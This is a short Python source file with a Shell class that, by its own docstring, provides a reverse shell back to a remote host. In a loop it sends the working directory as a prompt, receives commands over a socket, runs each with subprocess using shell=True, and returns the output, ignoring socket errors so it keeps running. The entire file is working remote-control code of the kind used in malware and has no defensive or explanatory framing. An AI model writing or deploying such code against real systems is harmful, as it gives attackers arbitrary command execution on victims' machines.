from encodings import utf_8
import os
import socket
import subprocess


class Shell:
    """
    Gets a simple reverse shell back to host
    """

    def __init__(self, sock: socket) -> None:
        """
        Constructor

        :param sock: The socket to send the data through
        """
        self.sock = sock

    def get_shell(self) -> None:
        """
        Executes received commands from the server and sends the output back through the socket
        """

        while 1:  # Infinite loop
            try:
                # Gets cwd and sends to server
                self.sock.send(str.encode(os.getcwd() + "# "))

                # Receives messages from server
                data = self.sock.recv(1024).decode("UTF-8")
                data = data.strip('\n')

                # Special cases
                if data == "quit" or data == "exit":  # Exits shell
                    break

                if data[:2] == "cd":  # Changes directory
                    os.chdir(data[3:])

                if data == "ls":  # Lists cwd with ls
                    data = "dir"

                if len(data) > 0:
                    # Executes arbitrary command
                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)
                    stdout_value = proc.stdout.read() + proc.stderr.read()
                    output_str = str(stdout_value, "UTF-8")

                    # Sends output back to server
                    self.sock.send(str.encode("\n" + output_str))

            except socket.error:
                continue
